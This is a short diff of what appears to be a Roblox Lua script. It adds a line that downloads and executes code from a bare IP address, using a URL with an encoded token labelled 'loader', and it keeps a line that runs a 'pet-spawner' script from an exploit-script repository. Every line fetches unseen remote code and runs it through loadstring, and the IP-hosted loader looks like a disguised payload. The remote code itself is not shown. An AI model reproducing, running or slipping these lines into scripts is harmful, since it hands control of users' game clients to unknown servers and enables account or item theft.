@@ -1,2 +1,2 @@
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjAwMWJiMzY2LWRjODAtNDMwNy04ZjU4LTU0OWEzZTU0NTU4OCIsImtpbmQiOiJsb2FkZXIifQ"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeOPScriptz/EAZY-HUB/refs/heads/main/pet-spawner.luascript"))()
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/mb9ouUokXx/0"))()
